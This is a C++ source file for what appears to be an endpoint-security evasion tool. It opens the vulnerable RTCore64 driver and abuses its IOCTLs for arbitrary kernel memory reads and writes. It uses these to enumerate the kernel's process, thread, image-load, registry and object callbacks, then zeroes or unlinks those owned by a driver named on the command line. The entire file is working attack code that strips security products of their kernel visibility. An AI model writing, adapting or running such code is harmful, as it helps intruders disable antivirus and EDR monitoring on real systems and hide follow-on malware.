// winio64.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>
#include <stdio.h>
#include <psapi.h>
#include "header.h"
#include "ntoskrnlOffsets.h"

#define DEVICE_NAME L"\\\\.\\RTCore64"
#define READ_IOCTL 0x80002048
#define WRITE_IOCTL 0x8000204C

#define OFFSET_PspCreateProcessNotifyRoutine  g_ntoskrnlOffsets.st.PspCreateProcessNotifyRoutine
#define OFFSET_PspCreateThreadNotifyRoutine g_ntoskrnlOffsets.st.PspCreateThreadNotifyRoutine
#define OFFSET_PspLoadImageNotifyRoutine g_ntoskrnlOffsets.st.PspLoadImageNotifyRoutine
#define OFFSET_CallbackListHead g_ntoskrnlOffsets.st.CallbackListHead
#define OFFSET_PsProcessType g_ntoskrnlOffsets.st.PsProcessType
#define OFFSET_PsThreadType g_ntoskrnlOffsets.st.PsThreadType

#pragma comment(lib, "Version.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "Winhttp.lib")


typedef NTSTATUS(WINAPI* pNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

HANDLE hDevice = NULL;
LPVOID nt_addr = NULL;

typedef struct READ_BUFFER {
    DWORD64 Padding0;
    DWORD64 ReadAddr;
    DWORD64 Padding1;
    DWORD   ReadSize;
    DWORD OutputData;
    DWORD64 Padding2;
    DWORD64 Padding3;
} _READ_BUFFER, * PREAD_BUFFER;

typedef struct WRITE_BUFFER {
    DWORD64 Padding0;
    DWORD64 WriteAddr;
    DWORD64 Padding1;
    DWORD   WriteSize;
    DWORD   Data;
    DWORD64 Padding2;
    DWORD64 Padding3;
} _WRITE_BUFFER, * PWRITE_BUFFER;

PVOID GetBase(LPCWSTR name)
{
    BOOL status;
    LPVOID* pImageBase;
    DWORD ImageSize;
    WCHAR driverName[1024];
    LPVOID driverBase = nullptr;

    status = EnumDeviceDrivers(nullptr, 0, &ImageSize);

    pImageBase = (LPVOID*)VirtualAlloc(nullptr, ImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

    status = EnumDeviceDrivers(pImageBase, ImageSize, &ImageSize);

    int driver_count = ImageSize / sizeof(pImageBase[0]);

    for (int i = 0; i < driver_count; i++) {
        GetDeviceDriverBaseNameW(pImageBase[i], driverName, sizeof(driverName) / sizeof(char));

        if (!wcscmp(name, driverName)) {
            driverBase = pImageBase[i];
            break;
        }
    }

    return driverBase;
}

BOOL FindDriverName(DWORD64 DriverAddress, char* DriverName, DWORD DriverSize) {
    BOOL ret = FALSE;
    LPVOID Drivers[1000] = { 0 };
    DWORD cbNeeded;
    DWORD64 Diff = -1;		// max possible == 0xffffffffffffffff

    // find the driver closest to the given Address
    if (EnumDeviceDrivers(Drivers, sizeof(Drivers), &cbNeeded)) {
        int NoDrivers = cbNeeded / sizeof(Drivers[0]);
        for (int i = 0; i < NoDrivers; i++) {
            if ((DWORD64)Drivers[i] <= DriverAddress) {
                DWORD64 CurrentDiff = DriverAddress - (DWORD64)Drivers[i];

                // if smaller difference found, store it
                if (CurrentDiff < Diff) {
                    Diff = CurrentDiff;
                }
            }
        }
    }
    if (Diff != -1)
        if (GetDeviceDriverBaseNameA((LPVOID)(DriverAddress - Diff), (LPSTR)DriverName, DriverSize))
            ret = TRUE;

    return ret;
}

PVOID KRead(DWORD64 Address, DWORD size) {

    PVOID outAddress = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD64 destAddr = 0;

    for (int i = 0; i < size / 4; i++) {

        READ_BUFFER rbuf = { 0 };
        rbuf.ReadAddr = Address + (i * 4);
        rbuf.ReadSize = 0x4;
        destAddr = (DWORD64)outAddress + (i * 4);

        NTSTATUS success = DeviceIoControl(
            hDevice,
            READ_IOCTL,
            &rbuf,
            sizeof(rbuf),
            &rbuf,
            sizeof(rbuf),
            nullptr,
            nullptr);

        if (!success) {
            return FALSE;
        }

        memcpy((PVOID)destAddr, &rbuf.OutputData, 0x4);

    }
    return outAddress;
}

BOOL KWrite(DWORD64 WAddress, PVOID Data, DWORD size) {

    for (int i = 0; i < size / 4; i++) {

        WRITE_BUFFER wbuf = { 0 };
        wbuf.WriteAddr = WAddress + (i * 4);
        wbuf.Data = *(DWORD*)((PUCHAR)Data + (i * 4));
        wbuf.WriteSize = 0x4;

        NTSTATUS success = DeviceIoControl(
            hDevice,
            WRITE_IOCTL,
            &wbuf,
            sizeof(wbuf),
            &wbuf,
            sizeof(wbuf),
            nullptr,
            nullptr);

        if (!success) {
            return FALSE;
        }
    }

    return TRUE;
}

BOOL FindNotifyRoutine(char* TargetName, char* NotificationType) {
    DWORD64 NotificationAddress = 0;
    if (!_stricmp(NotificationType, "PspCreateProcessNotifyRoutine"))
        NotificationAddress = (DWORD64)nt_addr + OFFSET_PspCreateProcessNotifyRoutine;
    if (!_stricmp(NotificationType, "PspCreateThreadNotifyRoutine"))
        NotificationAddress = (DWORD64)nt_addr + OFFSET_PspCreateThreadNotifyRoutine;
    if (!_stricmp(NotificationType, "PspLoadImageNotifyRoutine"))
        NotificationAddress = (DWORD64)nt_addr + OFFSET_PspLoadImageNotifyRoutine;

    printf("[+] Searching for %s Callbacks:\n", NotificationType);
    for (int i = 0; i < 64; i++) {
        DWORD64 NotifyCallback = (DWORD64)KRead((DWORD64)NotificationAddress + (i * sizeof(DWORD64)), 8);
        NotifyCallback = *(DWORD64*)NotifyCallback;
        if (NotifyCallback) {
            DWORD64 NotifyFunction = (DWORD64)KRead((NotifyCallback & -0x10) + 8, 8);
            NotifyFunction = *(DWORD64*)NotifyFunction;
            char DriverName[100];
            memset(DriverName, 0, sizeof(DriverName));
            if (!(FindDriverName(NotifyFunction, DriverName, sizeof(DriverName))))
                strcpy_s(DriverName, sizeof(DriverName), "NULL");
            printf("[*]\t Registered Callback Function: 0x%llx | Driver: %s", NotifyFunction, DriverName);

            if (!_stricmp(DriverName, TargetName)) {
                PVOID Data = 0; // Remove Callback
                BOOL res = KWrite((DWORD64)NotificationAddress + (i * sizeof(DWORD64)), &Data, sizeof(DWORD64));

                if (res) {
                    printf(" [REMOVED] ");
                }
                else {
                    printf(" [UNABLE TO REMOVE] ");
                }

            }
            printf("\n");
        }
    }

    return TRUE;
}

BOOL FindRegistryRoutine(char* TargetName) {
    printf("[+] Searching for Registry Callbacks:\n");

    // Get list head
    DWORD64 RegCallBack = (DWORD64)nt_addr + OFFSET_CallbackListHead;
    DWORD64 CallbackHead = *(DWORD64*)KRead(RegCallBack, 8);

    DWORD64 ListHead = CallbackHead;
    DWORD64 ListNext = CallbackHead;
    DWORD64 ListPrev = CallbackHead;

    do {
        // Read NotifyFunction (_CM_CALLBACK.Function)
        DWORD64 NotifyFunction = *(DWORD64*)KRead(ListNext + 0x28, 8);

        // Resolve owning driver
        char DriverName[100] = { 0 };
        if (!FindDriverName(NotifyFunction, DriverName, sizeof(DriverName))) {
            strcpy_s(DriverName, sizeof(DriverName), "NULL");
        }

        printf("[*]\t Registered Callback Function: 0x%llx | Driver: %s",
            NotifyFunction, DriverName);

        // If driver matches our target, attempt unlink
        if (!_stricmp(DriverName, TargetName)) {
            DWORD64 ListCurr = ListNext;

            // Read forward link (next entry in list)
            DWORD64 NextEntry = *(DWORD64*)KRead(ListNext, 8);

            // Patch the list: update previous->Flink and previous->Blink
            if (!KWrite(ListPrev, &NextEntry, sizeof(DWORD64)) ||
                !KWrite(ListPrev + 0x8, &NextEntry, sizeof(DWORD64))) {
                printf(" [UNABLE TO REMOVE]");
            }
            else {
                printf(" [REMOVED]");
            }

            // Restore ListNext so loop prints correctly
            ListNext = ListCurr;
        }

        printf("\n");

        // Move to next entry
        ListPrev = ListNext;
        ListNext = *(DWORD64*)KRead(ListNext, 8);

    } while (ListNext != ListHead && ListNext != 0);

    return TRUE;
}

BOOL FindObjectRoutine(char* TargetName, char* NotificationType) {

    DWORD64 NotificationAddress = 0;
    if (!_stricmp(NotificationType, "PsProcessType"))
        NotificationAddress = (DWORD64)KRead((DWORD64)nt_addr + OFFSET_PsProcessType, 8);
    if (!_stricmp(NotificationType, "PsThreadType"))
        NotificationAddress = (DWORD64)KRead((DWORD64)nt_addr + OFFSET_PsThreadType, 8);
    NotificationAddress = *(DWORD64*)NotificationAddress;

    printf("[+] Searching for %s Object Callbacks:\n", NotificationType);

    // Get the list head address (not the first entry)
    DWORD64 ListHeadAddress = NotificationAddress + 0xc8;
    DWORD64 FirstEntry = (DWORD64)KRead(ListHeadAddress, 8);
    FirstEntry = *(DWORD64*)FirstEntry;

    DWORD64 CurrentEntry = FirstEntry;

    // Check if list is empty
    if (CurrentEntry == ListHeadAddress) {
        printf("[-] No callbacks found\n");
        return TRUE;
    }

    do {
        DWORD64 PreNotifyFunction = (DWORD64)KRead(CurrentEntry + 0x28, 8);
        PreNotifyFunction = *(DWORD64*)PreNotifyFunction;
        DWORD64 PostNotifyFunction = (DWORD64)KRead(CurrentEntry + 0x30, 8);
        PostNotifyFunction = *(DWORD64*)PostNotifyFunction;

        char DriverName[100];
        memset(DriverName, 0, sizeof(DriverName));

        if (PreNotifyFunction) {
            if (!(FindDriverName(PreNotifyFunction, DriverName, sizeof(DriverName))))
                strcpy_s(DriverName, sizeof(DriverName), "NULL");

            printf("[*]\t Registered Pre-Operation Callback Function: 0x%llx | Driver: %s", PreNotifyFunction, DriverName);

            if (!_stricmp(DriverName, TargetName)) {
                PVOID Data = 0;
                BOOL res = KWrite(CurrentEntry + 0x28, &Data, sizeof(DWORD64));
                if (res) {
                    printf(" [REMOVED] ");
                }
                else {
                    printf(" [UNABLE TO REMOVE] ");
                }
            }
            printf("\n");
        }

        if (PostNotifyFunction) {
            if (!(FindDriverName(PostNotifyFunction, DriverName, sizeof(DriverName))))
                strcpy_s(DriverName, sizeof(DriverName), "NULL");

            printf("[*]\t Registered Post-Operation Callback Function: 0x%llx | Driver: %s", PostNotifyFunction, DriverName);

            if (!_stricmp(DriverName, TargetName)) {
                PVOID Data = 0;
                BOOL res = KWrite(CurrentEntry + 0x30, &Data, sizeof(DWORD64));
                if (res) {
                    printf(" [REMOVED] ");
                }
                else {
                    printf(" [UNABLE TO REMOVE] ");
                }
            }
            printf("\n");
        }

        // Move to next entry using Flink (offset 0x0)
        CurrentEntry = (DWORD64)KRead(CurrentEntry, 8);
        CurrentEntry = *(DWORD64*)CurrentEntry;

    } while (CurrentEntry != ListHeadAddress && CurrentEntry != 0);

    return TRUE;
}

int main(int argc, char* argv[]) {

    printf("[+] Opening handle to device\n");
    hDevice = CreateFileW(
        DEVICE_NAME,
        GENERIC_WRITE,
        FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        0,
        nullptr
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open device! Error: 0x%X\n", GetLastError());
        return 1;
    }

    LoadNtoskrnlOffsetsFromInternet(TRUE);

    nt_addr = GetBase(L"ntoskrnl.exe");
    printf("[+] Nt Base Address: 0x%p\n", nt_addr);

    char DriverName[100] = { 0 };
    if (argc > 1) {
        strcpy_s(DriverName, sizeof(DriverName), argv[1]);
    }

    printf("\n");
    FindNotifyRoutine(DriverName, (char*)"PspCreateProcessNotifyRoutine");

    printf("\n");
    FindNotifyRoutine(DriverName, (char*)"PspCreateThreadNotifyRoutine");

    printf("\n");
    FindNotifyRoutine(DriverName, (char*)"PspLoadImageNotifyRoutine");

    printf("\n");
    FindRegistryRoutine(DriverName);

    printf("\n");
    FindObjectRoutine(DriverName, (char*)"PsProcessType");

    printf("\n");
    FindObjectRoutine(DriverName, (char*)"PsThreadType");

    CloseHandle(hDevice);
    return 0;
}